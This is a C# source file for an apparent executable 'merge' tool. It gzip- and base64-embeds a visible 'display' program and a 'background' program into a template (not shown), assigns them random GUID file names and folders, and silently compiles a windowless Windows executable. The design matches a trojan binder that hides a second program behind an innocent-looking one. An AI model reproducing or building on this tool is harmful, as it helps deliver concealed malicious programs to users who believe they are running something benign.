using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Text;

namespace exeMerge
{
    public class MergeWorker
    {
        public delegate void MergeComplete();
        public event MergeComplete mergeCompleteHandler;

        private const string EXE_PATTERN = "pattern.cs";
        private const string CS_EXTENSTION = ".cs";
        private const string EXE_EXTENSTION = ".exe";

        private const string DISPLAY_FILE_DATA = "DISPLAY_FILE_PATTERN";
        private const string DISPLAY_FILE_NAME = "DS.EXE";
        private const string DISPLAY_FOLDER = "DS_FOLDER";

        private const string BACKGROUND_FILE_DATA = "BACKGROUND_FILE_PATTERN";
        private const string BACKGROUND_FILE_NAME = "BG.EXE";
        private const string BACKGROUND_FOLDER = "BG_FOLDER";

        public bool isRunning = false;

        private BackgroundWorker worker;

        private string displayFile = String.Empty;
        private string displayFolder = String.Empty;
        private string backgroundFile = String.Empty;
        private string backgroundFolder = String.Empty;
        private string outputFile = String.Empty;
        private string compilerFile = String.Empty;

        public MergeWorker()
        {
            worker = new BackgroundWorker();
            worker.DoWork += Worker_DoWork;
            worker.RunWorkerCompleted += Worker_RunWorkerCompleted;
        }

        public void execute(string _displayFile, string _displayFolder, string _backgroundFile, string _backgroundFolder, string _outputFile, string _compilerFile)
        {
            if (!isRunning)
            {
                displayFile = _displayFile;
                displayFolder = _displayFolder;
                backgroundFile = _backgroundFile;
                backgroundFolder = _backgroundFolder;
                outputFile = _outputFile;
                compilerFile = _compilerFile;

                worker.RunWorkerAsync();
            }
        }

        private void Worker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            isRunning = false;
            mergeCompleteHandler();

        }

        private string compress(byte[] bytes)
        {
            var memoryStream = new MemoryStream();

            using (var gZipStream = new GZipStream(memoryStream, CompressionMode.Compress, true))
            {
                gZipStream.Write(bytes, 0, bytes.Length);
            }

            memoryStream.Position = 0;

            var compressedData = new byte[memoryStream.Length];
            memoryStream.Read(compressedData, 0, compressedData.Length);

            byte[] gZipBuffer = new byte[compressedData.Length + 4];
            Buffer.BlockCopy(compressedData, 0, gZipBuffer, 4, compressedData.Length);
            Buffer.BlockCopy(BitConverter.GetBytes(bytes.Length), 0, gZipBuffer, 0, 4);
            return Convert.ToBase64String(gZipBuffer);


        }

        private void createExe(string patternFile)
        {
            string arguments = "/target:winexe /out:" + '"' + outputFile + '"' + " " + '"' + patternFile + '"';
            ProcessStartInfo info = new ProcessStartInfo(compilerFile, arguments);
            info.UseShellExecute = false;
            info.CreateNoWindow = true;
            info.RedirectStandardOutput = true;
            Process poc = new Process();
            poc.StartInfo = info;
            poc.Start();
            poc.WaitForExit();
            string text = poc.StandardOutput.ReadToEnd();

        }

        private void Worker_DoWork(object sender, DoWorkEventArgs e)
        {

            try
            {
                string displayFileGzip = compress(File.ReadAllBytes(displayFile));
                string backgroundFileGzip = compress(File.ReadAllBytes(backgroundFile));

                if (File.Exists(outputFile))
                {
                    File.Delete(outputFile);
                }

                string pattern = File.ReadAllText(AppDomain.CurrentDomain.BaseDirectory + EXE_PATTERN);

                pattern = pattern.Replace(DISPLAY_FILE_NAME, Guid.NewGuid().ToString().Replace("-", "") + EXE_EXTENSTION);
                pattern = pattern.Replace(DISPLAY_FILE_DATA, displayFileGzip);
                pattern = pattern.Replace(DISPLAY_FOLDER, displayFolder);

                pattern = pattern.Replace(BACKGROUND_FILE_DATA, backgroundFileGzip);
                pattern = pattern.Replace(BACKGROUND_FILE_NAME, Guid.NewGuid().ToString().Replace("-", "") + EXE_EXTENSTION);
                pattern = pattern.Replace(BACKGROUND_FOLDER, backgroundFolder);

                string patternFile = AppDomain.CurrentDomain.BaseDirectory + Guid.NewGuid().ToString().Replace("-", "") + CS_EXTENSTION;

                File.WriteAllText(patternFile, pattern);

                createExe(patternFile);

                File.Delete(patternFile);

            }
            catch (Exception)
            {
                throw;
            }
        }

    }
}
